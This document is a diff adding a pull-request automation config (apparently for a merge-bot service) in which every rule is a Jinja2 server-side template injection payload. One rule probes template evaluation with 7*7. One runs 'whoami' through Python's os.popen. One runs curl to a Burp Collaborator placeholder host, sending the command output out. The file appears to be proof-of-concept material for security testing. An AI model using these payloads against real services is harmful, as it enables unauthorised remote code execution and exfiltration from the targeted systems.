@@ -1,0 +1,21 @@
+pull_request_rules:
+  - name: ssti-math
+    conditions: []
+    actions:
+      post_check:
+        title: "7*7={{ 7*7 }}"
+        summary: ""
+
+  - name: ssti-rce
+    conditions: []
+    actions:
+      post_check:
+        title: "{{ lipsum.__globals__['os'].popen('whoami').read() }}"
+        summary: ""
+
+  - name: ssti-pingback
+    conditions: []
+    actions:
+      post_check:
+        title: "{{ lipsum.__globals__['os'].popen('curl https://YOUR-CALLBACK.burpcollaborator.net/$(whoami)').read() }}"
+        summary: ""
